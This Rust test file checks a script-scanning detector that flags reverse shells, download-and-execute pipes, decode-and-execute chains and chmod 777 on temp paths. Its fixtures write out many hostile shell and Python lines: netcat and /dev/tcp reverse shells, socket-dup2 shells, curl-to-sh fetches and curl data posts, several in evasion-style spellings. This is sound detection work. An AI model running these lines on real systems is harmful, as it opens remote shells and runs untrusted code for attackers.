use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o755,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: true,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
    super::s4_family_tests::run(
        vec![entry(path, kind, source.len())],
        &[(path, source.as_bytes())],
    )
}

fn findings_with(artifacts: &AnalysisArtifacts, rule_id: &str) -> Vec<String> {
    artifacts
        .rendered_findings()
        .iter()
        .filter(|finding| finding.rule_id == rule_id)
        .map(|finding| finding.evidence.clone())
        .collect()
}

#[test]
fn reverse_shell_spellings_are_high_findings() {
    let sh = r#"#!/bin/sh
nc -e /bin/sh 203.0.113.7 4444
bash -i >& /dev/tcp/203.0.113.7/4445 0>&1
socat TCP-LISTEN:9001,reuseaddr EXEC:/bin/sh
netcat -le 4446
"#;
    let (artifacts, inventory) = one("rev.sh", PayloadKind::Shell, sh);
    let evidence = findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE);
    assert_eq!(evidence.len(), 4, "{evidence:?}");
    for finding in artifacts.rendered_findings() {
        assert_eq!(finding.rule_id, SCRIPT_REVERSE_SHELL_RULE);
        assert_eq!(finding.severity, "high");
        assert_eq!(finding.confidence.as_deref(), Some("lexical-fallback"));
    }
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
}

#[test]
fn netcat_without_execute_stays_silent() {
    for line in ["nc -lvnp 4444", "ncat 203.0.113.7 4444", "netcat -l 4444"] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("listen.sh", PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn echoed_spellings_are_operands_never_commands() {
    // Second-review command-position cases: every needle word below is
    // an operand of `echo`, so no High rule may fire.
    for line in [
        "echo chmod 777 /tmp/not-executed",
        "echo /dev/tcp/203.0.113.7/4444",
        "echo base64 -d | sh",
        "echo nc -e /bin/sh 203.0.113.7 4444",
        "echo curl https://example.test/x | sh",
        "echo sudo /tmp/helper",
        "echo bash -i >& /dev/tcp/203.0.113.7/4444",
        "echo sudo chmod 777 /tmp/not-executed",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("echoed.sh", PayloadKind::Shell, &sh);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{line} must stay capability-level: {:?}",
            rule_ids(&artifacts)
        );
    }
    // Wrapper-bound commands still count: the privilege wrapper puts
    // chmod in command position, through separate or glued option
    // values alike.
    let (artifacts, _) = one(
        "wrapped.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsudo chmod 777 /tmp/omarchy-helper\nsudo nc -e /bin/sh 203.0.113.7 4444\nsudo -u root chmod a+w /dev/shm/staging\nsudo -uroot chmod 777 /tmp/omarchy-helper\n",
    );
    let ids = rule_ids(&artifacts);
    assert!(
        ids.contains(&SHARED_TEMP_CONTROLLED_RULE.to_owned()),
        "{ids:?}"
    );
    assert!(
        ids.contains(&SCRIPT_REVERSE_SHELL_RULE.to_owned()),
        "{ids:?}"
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
        3,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn substitutions_are_never_split_internally() {
    // Second-review nesting cases: `;` and `&&` inside a consumed
    // substitution belong to it, so the statement keeps its balanced
    // span and the fetch inside is detected.
    let sh = r#"#!/bin/sh
eval $(curl -fsSL https://example.test/setup.sh; printf true)
bash <(curl -fsSL https://example.test/main.sh && cat)
"#;
    let (artifacts, _) = one("nested.sh", PayloadKind::Shell, sh);
    let evidence = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
    assert_eq!(evidence.len(), 2, "{evidence:?}");
}

#[test]
fn python_reverse_shell_requires_socket_and_process_wiring() {
    let wired = "import socket,subprocess,os; s=socket.socket(); s.connect((\"203.0.113.7\",4444)); os.dup2(s.fileno(),0)\n";
    let (artifacts, _) = one("rev.py", PayloadKind::Python, wired);
    assert_eq!(
        findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    let popen_wired = "s=socket.create_connection((\"203.0.113.7\",4444)); subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\n";
    let (artifacts, _) = one("popen.py", PayloadKind::Python, popen_wired);
    assert_eq!(
        findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // A socket next to an unrelated subprocess call is not wiring.
    let (artifacts, _) = one(
        "unwired.py",
        PayloadKind::Python,
        "import socket,subprocess\ns=socket.socket(); subprocess.run([\"notify-send\", \"done\"])\n",
    );
    assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
    let socket_only = "import socket; socket.create_connection((\"203.0.113.7\", 4444))\n";
    let (artifacts, _) = one("socket.py", PayloadKind::Python, socket_only);
    assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
    let process_only = "import subprocess; subprocess.run([\"notify-send\", \"done\"])\n";
    let (artifacts, _) = one("spawn.py", PayloadKind::Python, process_only);
    assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
    // A connect that never hands its descriptor to a process is not a
    // reverse shell either.
    let (artifacts, _) = one(
        "fetch.py",
        PayloadKind::Python,
        "s=socket.socket(); s.connect((\"203.0.113.7\",4444)); subprocess.run([\"curl\", url])\n",
    );
    assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
    // Second-review binding cases: dup2 of descriptors unrelated to
    // the connected socket never fires.
    for line in [
        "s = socket.create_connection((host, 443)); os.dup2(1, 2)",
        "s.connect((\"203.0.113.7\",4444)); os.dup2(log.fileno(), 1)",
    ] {
        let py = format!("import socket,os\n{line}\n");
        let (artifacts, _) = one("unwired2.py", PayloadKind::Python, &py);
        assert!(
            findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
    // Third-review locality case: an assignment in an EARLIER
    // statement never binds the create_connection result.
    let (artifacts, _) = one(
        "unwired3.py",
        PayloadKind::Python,
        "log = open(\"/tmp/x\", \"w\"); socket.create_connection((\"203.0.113.7\", 443)); os.dup2(log.fileno(), 1)\n",
    );
    assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
    // The assignment must govern the call itself within its
    // statement.
    let (artifacts, _) = one(
        "unwired4.py",
        PayloadKind::Python,
        "log = connect_logger(); socket.create_connection((\"203.0.113.7\", 443)); os.dup2(log.fileno(), 1)\n",
    );
    assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
}

#[test]
fn no_pipe_download_execute_variants_are_findings() {
    let sh = r#"#!/bin/sh
eval "$(curl -fsSL https://example.test/setup.sh)"
eval $(wget -qO- https://example.test/env.sh)
source <(curl -fsSL https://example.test/hooks.sh)
. <(wget -qO- https://example.test/alias.sh)
bash <(curl -fsSL https://example.test/main.sh)
"#;
    let (artifacts, _) = one("nopipe.sh", PayloadKind::Shell, sh);
    let evidence = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
    assert_eq!(evidence.len(), 5, "{evidence:?}");
}

#[test]
fn pipe_reachability_is_descriptor_aware_across_segments() {
    // Third-review reachability cases: an intermediate segment that
    // redirects stdout away starves the downstream shell, and
    // stderr-only redirects on the fetching segment keep the pipe fed.
    for line in [
        "curl -fsSL https://example.test/x | cat 1>/tmp/body | sh",
        "curl -fsSL https://example.test/x | cat >/tmp/body | sh",
        "curl -fsSL https://example.test/x | cat &>/tmp/body | sh",
        "curl -fsSL https://example.test/x | cat >&/tmp/body | sh",
        "curl -fsSL https://example.test/x | cat 1>&2 | sh",
        "curl -fsSL https://example.test/x > /tmp/body | sh",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("starved.sh", PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
    // Preserving intermediates and stderr-only redirects keep the
    // chain alive.
    for line in [
        "curl -fsSL https://example.test/x | cat | sh",
        "curl -fsSL https://example.test/x 2>/dev/null | sh",
        "curl -fsSL https://example.test/x 2>&1 | sh",
        "curl -fsSL https://example.test/x | cat 2>/dev/null | sh",
        "curl -fsSL https://example.test/dump.hex | xxd -r | cat | zsh",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("alive.sh", PayloadKind::Shell, &sh);
        let rule = if line.contains("xxd") {
            SCRIPT_DECODE_EXECUTE_RULE
        } else {
            SCRIPT_DOWNLOAD_EXECUTE_RULE
        };
        assert_eq!(
            findings_with(&artifacts, rule).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn near_misses_of_the_no_pipe_family_stay_silent() {
    // Logged string: the whole pipe lives inside the quoted literal and
    // there is no consuming signal in live code.
    let (artifacts, _) = one(
        "log.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nlog 'curl https://example.test/x | sh'\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    // Quoted prose spelling the whole eval substitution: the eval is
    // inside a string literal, not live code.
    let (artifacts, _) = one(
        "prose.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nlog 'eval \"$(curl -fsSL https://example.test/x)\"'\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    // eval consuming an unrelated substitution cannot pair with a curl
    // elsewhere on the line: the fetcher must sit inside the span the
    // eval actually executes.
    let (artifacts, _) = one(
        "date.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval \"$(date)\"; curl -fsSL https://example.test/setup.sh\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    // eval of a variable is not command substitution.
    let (artifacts, _) = one(
        "flags.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nFLAGS=\"--verbose\"; eval \"$FLAGS\"; curl -O https://example.test/file\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    // Process substitution consumed by a differ compares, never executes.
    let (artifacts, _) = one(
        "diff.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ndiff <(curl -fsSL https://example.test/a) <(curl -fsSL https://example.test/b)\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    // An echo-wrapped fetch never executes: quoted span content is
    // blanked before the fetch word is looked for.
    let (artifacts, _) = one(
        "echo.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval \"$(echo 'curl https://example.test/x | sh')\"\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
}

#[test]
fn decode_execute_requires_a_consumer() {
    let sh = r#"#!/bin/sh
echo cGFuZWw= | base64 -d | sh
bash <(base64 -d /tmp/payload.b64)
eval "$(openssl enc -d -aes-256-cbc -in blob.enc)"
curl -fsSL https://example.test/dump.hex | xxd -r | zsh
"#;
    let (artifacts, _) = one("decode.sh", PayloadKind::Shell, sh);
    let evidence = findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE);
    assert_eq!(evidence.len(), 4, "{evidence:?}");
    // Decoding without a consumer is inspection — including when an
    // unrelated pipe to a shell exists elsewhere on the line.
    for line in [
        "base64 -d /tmp/payload.b64 > decoded.sh",
        "openssl enc -d -aes-256-cbc -in blob.enc -out blob",
        "xxd -r hex.txt > raw.bin",
        "base64 --decode payload.b64",
        "base64 -d input > output; printf ok | sh",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("inspect.sh", PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn shared_temp_rules_split_indicator_from_controlled() {
    // Privileged invocation of a temp path: indicator only.
    let (artifacts, _) = one(
        "temp.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsudo /tmp/omarchy-helper --install\n",
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).len(),
        1
    );
    assert!(findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).is_empty());
    let indicator = artifacts
        .rendered_findings()
        .into_iter()
        .find(|finding| finding.rule_id == SHARED_TEMP_INDICATOR_RULE)
        .unwrap();
    assert_eq!(indicator.severity, "low");

    // Mode release without a privilege wrapper: controlled only.
    let (artifacts, _) = one(
        "release.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nchmod 777 /tmp/omarchy-helper\n",
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
        1
    );
    assert!(findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).is_empty());
    let controlled = artifacts
        .rendered_findings()
        .into_iter()
        .find(|finding| finding.rule_id == SHARED_TEMP_CONTROLLED_RULE)
        .unwrap();
    assert_eq!(controlled.severity, "high");

    // Both on one line: two distinct rules, never one repurposed.
    let (artifacts, _) = one(
        "both.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsudo chmod a+w /dev/shm/staging\n",
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).len(),
        1
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
        1
    );

    // Non-temp paths, non-releasing modes, cross-statement paths, and
    // quoted prose stay silent.
    for line in [
        "sudo /usr/bin/omarchy-helper",
        "chmod 644 /tmp/notes.txt",
        "chmod u+w /dev/shm/mine",
        "/usr/bin/chmod 755 /tmp/script.sh",
        "chmod 777 \"$HOME/private\"; echo /tmp/note",
        "echo /tmp/note; chmod 777 /home/user/private",
        "printf 'sudo /tmp/helper'",
        "printf 'chmod 777 /tmp/payload'",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("quiet.sh", PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).is_empty()
                && findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn script_fetch_tools_record_network_access_capability() {
    let sh = "#!/bin/sh\ncurl -fsSL -d \"$payload\" https://example.test/collect\nwget -qO- https://example.test/feed > feed.json\n";
    let (artifacts, inventory) = one("egress.sh", PayloadKind::Shell, sh);
    let network: Vec<_> = artifacts
        .capabilities
        .iter()
        .filter(|capability| capability.capability == "network-access")
        .collect();
    assert_eq!(network.len(), 2, "{:?}", artifacts.capabilities);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "fetch without execute must stay capability-level: {:?}",
        rule_ids(&artifacts)
    );
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    // A quoted curl mention is not egress.
    let (artifacts, _) = one(
        "log2.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nlog 'curl https://example.test/x'\n",
    );
    assert!(
        !artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access")
    );
    // Third-review command scope: a curl WORD in echo's operands is
    // not egress; a fetch tool in command position still is.
    let (artifacts, _) = one(
        "echo3.sh",
        PayloadKind::Shell,
        "#!/bin/sh\necho curl https://example.test/not-egress\n",
    );
    assert!(
        !artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access"),
        "{:?}",
        artifacts.capabilities
    );
    let (artifacts, _) = one(
        "wget3.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nwget -qO- https://example.test/feed\n",
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access")
    );
}

#[test]
fn qml_process_argv_with_fetch_tool_records_network_access() {
    let source =
        "Process { command: [\"curl\", \"-d\", body, \"https://example.test/collect\"] }\n";
    let (artifacts, inventory) = run(
        vec![entry("Egress.qml", PayloadKind::Qml, source.len())],
        &[("Egress.qml", source.as_bytes())],
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access"),
        "{:?}",
        artifacts.capabilities
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "argv fetch alone is not a finding: {:?}",
        rule_ids(&artifacts)
    );
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    // Only the executable position attributes egress: a curl WORD in a
    // non-executable argument is not network access.
    let source = "Process { command: [\"notify-send\", \"curl failed\"] }\n";
    let (artifacts, _) = run(
        vec![entry("Calm.qml", PayloadKind::Qml, source.len())],
        &[("Calm.qml", source.as_bytes())],
    );
    assert!(
        !artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access"),
        "{:?}",
        artifacts.capabilities
    );
    // An interpreter head executes its `-c` body, which is live command
    // surface.
    let source = "Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n";
    let (artifacts, _) = run(
        vec![entry("Chain.qml", PayloadKind::Qml, source.len())],
        &[("Chain.qml", source.as_bytes())],
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access"),
        "{:?}",
        artifacts.capabilities
    );
    // Second-review command-position case: the `-c` body only invokes
    // echo; a curl WORD in its operands is not egress.
    let source = "Process { command: [\"sh\", \"-c\", \"echo curl failed\"] }\n";
    let (artifacts, _) = run(
        vec![entry("Echo.qml", PayloadKind::Qml, source.len())],
        &[("Echo.qml", source.as_bytes())],
    );
    assert!(
        !artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access"),
        "{:?}",
        artifacts.capabilities
    );
}

fn has_network(artifacts: &AnalysisArtifacts) -> bool {
    artifacts
        .capabilities
        .iter()
        .any(|capability| capability.capability == "network-access")
}

#[test]
fn quoted_command_tokens_keep_their_runtime_value() {
    // Quoting an executable or a flag removes the quotes at expansion,
    // so command position — not quote presence — decides execution.
    let (artifacts, _) = one(
        "qcurl.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n\"curl\" https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);

    let (artifacts, _) = one(
        "qnc.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nnc \"-e\" /bin/sh 203.0.113.7 4444\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );

    let (artifacts, _) = one(
        "qchmod.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nchmod \"777\" /tmp/omarchy-helper\n",
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );

    let (artifacts, _) = one(
        "qtcp.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nexec 5<>\"/dev/tcp/203.0.113.7/4444\"\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );

    // Prose stays prose: a quoted whole pipe is an operand of `log`.
    let (artifacts, _) = one(
        "qprose.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nlog \"curl https://example.test/x | sh\"\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty()
            && !has_network(&artifacts),
        "{:?}",
        artifacts.rendered_findings()
    );
    // A fetch word quoted as an assignment value never executes.
    let (artifacts, _) = one(
        "qassign.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nDOWNLOADER=\"curl\"\n",
    );
    assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn leading_redirections_do_not_hide_the_command() {
    // A redirection may precede the simple command; glued or separated,
    // it must not become the segment head.
    for line in [
        "2>/dev/null curl -fsSL https://example.test/x | sh",
        "2> /dev/null curl -fsSL https://example.test/x | sh",
        "2>>errs.log VAR=x curl -fsSL https://example.test/x | sh",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("redir.sh", PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
}

#[test]
fn separated_descriptor_duplication_keeps_the_pipe_fed() {
    // `>& 1` duplicates stdout onto itself: the shell still reads the
    // fetch, exactly as the glued `>&1` does.
    let (artifacts, _) = one(
        "dup1.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x >& 1 | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // Duplicating stdout onto stderr starves the pipe — still silent.
    let (artifacts, _) = one(
        "dup2.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x >& 2 | sh\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn command_substitutions_attribute_egress() {
    // The fetch lives in a substitution the outer assignment captures;
    // egress is recorded even though the segment head is a bare
    // assignment.
    for line in [
        "payload=$(curl -fsSL https://example.test/x)",
        "payload=\"$(curl -fsSL https://example.test/x)\"",
        "payload=`wget -qO- https://example.test/x`",
        "outer=$(printf '%s' $(curl -fsSL https://example.test/x))",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("subst.sh", PayloadKind::Shell, &sh);
        assert!(
            has_network(&artifacts),
            "{line} must record egress: {:?}",
            artifacts.capabilities
        );
    }
    // A single-quoted substitution never expands, so it is prose.
    let (artifacts, _) = one(
        "inert.sh",
        PayloadKind::Shell,
        "#!/bin/sh\npayload='$(curl -fsSL https://example.test/x)'\n",
    );
    assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn concatenated_quote_fragments_form_one_word() {
    // Adjacent quoted and unquoted fragments join into one runtime word:
    // `c"ur"l` is the command `curl`, not `c_ur_l`.
    let (artifacts, _) = one(
        "concat.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nc\"ur\"l https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn escaped_quote_keeps_the_separator_quoted() {
    // The `\"` is an escaped quote, so the string stays open and its `;`
    // is a literal — no statement split, no live curl, no egress.
    let (artifacts, _) = one(
        "escape.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nlog \"literal \\\"; curl https://example.test/x | sh\"\n",
    );
    assert!(
        !has_network(&artifacts)
            && findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn read_write_redirect_honours_the_explicit_descriptor() {
    // `1<>file` puts stdout on the file, so the downstream shell gets
    // EOF — no download-execute.
    let (artifacts, _) = one(
        "rw1.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x 1<>/tmp/body | sh\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    // A bare `<>` defaults to fd 0 (stdin), so stdout still feeds the pipe.
    let (artifacts, _) = one(
        "rw0.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x <>/dev/null | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn ampersand_terminates_the_preceding_pipeline() {
    // A single `&` backgrounds the pipeline before it: the fetch runs in
    // a NEW statement, so nothing reaches the downstream shell — egress
    // only, no High.
    let (artifacts, _) = one(
        "amp-first.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x & echo safe | sh\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // The backgrounded safe command hides nothing either: the statement
    // after `&` is detected on its own.
    let (artifacts, _) = one(
        "amp-last.sh",
        PayloadKind::Shell,
        "#!/bin/sh\necho safe & curl -fsSL https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // `&>` stays a redirection operator and never splits: the fetch's
    // stdout starves the downstream shell.
    let (artifacts, _) = one(
        "amp-redirect.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x &> /tmp/body | sh\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn redirect_targets_are_never_command_operands() {
    // A redirect target is a filename: `nc > -e host port` owns no `-e`
    // flag and `chmod > 777 /tmp/x` releases no mode.
    let (artifacts, _) = one(
        "target.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nnc > -e 203.0.113.7 4444\nchmod > 777 /tmp/omarchy-helper\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    // Real operands still bind when the redirect sits elsewhere in the
    // command.
    let (artifacts, _) = one(
        "operand.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nchmod 777 /tmp/omarchy-helper > install.log\nnc -e /bin/sh 203.0.113.7 4444 > session.log\n",
    );
    let ids = rule_ids(&artifacts);
    assert!(
        ids.contains(&SHARED_TEMP_CONTROLLED_RULE.to_owned()),
        "{ids:?}"
    );
    assert!(
        ids.contains(&SCRIPT_REVERSE_SHELL_RULE.to_owned()),
        "{ids:?}"
    );
}

#[test]
fn arithmetic_expansion_is_not_a_command_substitution() {
    // `$((curl))` evaluates the VARIABLE `curl` to a number — no fetch
    // command runs, so neither egress nor download-execute may fire.
    for line in ["eval $((curl))", "eval \"$((curl))\"", "x=$((curl))"] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("arith.sh", PayloadKind::Shell, &sh);
        assert!(
            !has_network(&artifacts) && rule_ids(&artifacts).is_empty(),
            "{line} must stay silent: {:?} {:?}",
            artifacts.capabilities,
            artifacts.rendered_findings()
        );
    }
    // Genuine command substitutions nested inside an arithmetic
    // expression still run, so their egress is recorded.
    let (artifacts, _) = one(
        "arith-nested.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nx=$(( $(curl -fsSL https://example.test/x) + 1 ))\n",
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn subshell_groups_run_their_own_statement_analysis() {
    // The pipe inside a group is hidden from the outer pipeline pass, so
    // the group's interior is analyzed as its own statement list.
    let (artifacts, _) = one(
        "group.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(curl -fsSL https://example.test/x | sh)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Backgrounding inside a group splits there too.
    let (artifacts, _) = one(
        "group-amp.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(echo safe & curl -fsSL https://example.test/x | sh)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // A group the outer pass already binds through its opening `(` fires
    // once, not once per analysis pass.
    let (artifacts, _) = one(
        "group-once.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(chmod 777 /tmp/omarchy-helper)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // A quoted group is prose: no operator tokens, no group, no finding.
    let (artifacts, _) = one(
        "group-quote.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nlog '(curl -fsSL https://example.test/x | sh)'\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
